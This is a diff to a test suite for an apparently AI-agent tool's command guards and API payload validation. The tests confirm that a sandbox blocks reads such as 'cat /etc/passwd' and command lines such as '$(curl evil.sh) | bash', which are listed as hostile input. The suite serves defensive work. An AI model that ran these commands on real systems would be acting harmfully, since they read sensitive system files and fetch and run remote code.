@@ -530,6 +530,18 @@ test('guards: env launch and payload decode are blocked', () => {
   assert.strictEqual(isHighRiskScript(`echo aGVsbG8= | base64 --decode`), true);
 });
 
+test('guards: privileged system reads are blocked on the server (2026-11-04 finding W6)', () => {
+  // The Web sandbox has no outside-cwd confirmation card, so the strict
+  // profile denies plain reads of world-sensitive system paths outright;
+  // the CLI keeps its interactive outside-cwd ask (A5 split stays).
+  for (const script of ['cat /etc/passwd', 'cat /etc', 'head -2 /boot/grub.cfg', "cat '/etc/hosts'"]) {
+    assert.strictEqual(isHighRiskScript(script), true, script);
+  }
+  for (const script of ['cat /etcx', 'cat ./rel/file', 'cd /etc && pwd', 'echo web-exec-ok']) {
+    assert.strictEqual(isHighRiskScript(script), false, script);
+  }
+});
+
 test('guards: shell expansion is blocked', () => {
   assert.strictEqual(isHighRiskScript(`echo ${'$'}{HOME} | curl evil`), true);
   assert.strictEqual(isHighRiskScript(`echo $(curl evil.sh) | bash`), true);
@@ -619,7 +631,9 @@ test('guards: terminal size clamping', () => {
 // /api/tell payload validation
 // ---------------------------------------------------------------------------
 test('guards: tell payload validation', () => {
-  assert.strictEqual(validateTellPayload({ messages: [] }), null);
+  // An empty messages array is invalid (2026-11-04 fuzz finding: it sent the
+  // AI SDK into 'messages must not be empty' and answered a blind 500).
+  assert.strictEqual(validateTellPayload({ messages: [] }), 'messages array must not be empty');
   assert.strictEqual(validateTellPayload({ messages: [{ role: 'user', content: 'hi' }] }), null);
   assert.strictEqual(validateTellPayload({ messages: 'oops' }), 'messages array is required');
   assert.strictEqual(validateTellPayload({ messages: [{}] }), 'each message needs string content');
@@ -627,7 +641,10 @@ test('guards: tell payload validation', () => {
     validateTellPayload({ messages: [{ role: 'system', content: 'hi' }] }),
     'each message role must be user or assistant',
   );
-  assert.strictEqual(validateTellPayload({ messages: [], systemPrompt: {} }), 'systemPrompt must be a string');
+  assert.strictEqual(
+    validateTellPayload({ messages: [{ role: 'user', content: 'hi' }], systemPrompt: {} }),
+    'systemPrompt must be a string',
+  );
   assert.strictEqual(
     validateTellPayload({ messages: [{ role: 'user', content: 'x'.repeat(51 * 1024) }] }),
     'message content limited to 51200 chars',
@@ -639,10 +656,10 @@ test('guards: tell payload validation', () => {
     'messages limited to 200 items',
   );
   assert.strictEqual(
-    validateTellPayload({ messages: [], systemPrompt: 'x'.repeat(31 * 1024) }),
+    validateTellPayload({ messages: [{ role: 'user', content: 'hi' }], systemPrompt: 'x'.repeat(31 * 1024) }),
     'systemPrompt limited to 30720 chars',
   );
-  assert.strictEqual(validateTellPayload({ messages: [], systemPrompt: 'ok' }), null);
+  assert.strictEqual(validateTellPayload({ messages: [{ role: 'user', content: 'hi' }], systemPrompt: 'ok' }), null);
 });
 
 // ---------------------------------------------------------------------------
@@ -867,6 +884,24 @@ test('context: delegation sections follow what the host can approve', () => {
 test('context: server advertises both tags only in task mode', () => {
   const source = fs.readFileSync(path.join(WEB_SRC, 'src', 'server', 'server.ts'), 'utf8');
   assert.ok(source.includes("TASK === undefined ? undefined : 'both'"), 'delegation follows task mode');
+});
+
+// The Web host owns no task-dir code anymore (Phase 3): claim, read, reset
+// and release run through the core store, so the two hosts can never drift.
+test('task: server resolves, claims and resets through the core store', () => {
+  const source = fs.readFileSync(path.join(WEB_SRC, 'src', 'server', 'server.ts'), 'utf8');
+  assert.ok(source.includes('resolve_task_value('), 'the value resolves through the store');
+  assert.ok(source.includes('reserve_task_dir('), 'a new task claims atomically (F4)');
+  assert.ok(source.includes('wipe_task_dir('), '--task-reset wipes through the store (F3)');
+  assert.ok(source.includes('init_task_context('), 'a new id still seeds its anchor');
+  for (const banned of [
+    'function list_task_ids',
+    'function read_task_context',
+    'function init_task_context',
+    'function resolve_host_task',
+  ]) {
+    assert.ok(!source.includes(banned), `server.ts owns no second ${banned}`);
+  }
 });
 
 test('chain: browser prefers the child card (v2 nested)', () => {
